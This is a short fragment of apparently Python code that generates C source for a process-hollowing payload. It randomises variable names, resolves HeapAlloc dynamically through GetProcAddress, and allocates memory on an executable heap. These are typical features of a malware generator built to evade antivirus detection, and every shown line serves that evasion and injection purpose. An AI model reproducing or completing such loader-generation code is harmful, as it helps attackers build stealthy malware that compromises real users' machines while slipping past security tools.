...
Hollow_code += Randheapvar + " = (HANDLE)" + NdcHeapcreate + "(0x00040000," + Randvarsize + " + 10, 0);\n"
Hollow_code += "FARPROC " + NdcHeapalloc + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"HeapAlloc\");\n"
Hollow_code += Randbuff + " = (LPVOID)" + NdcHeapalloc + "(" + Randheapvar + ", 0x00000008," + Randvarsize + " + 10);\n"
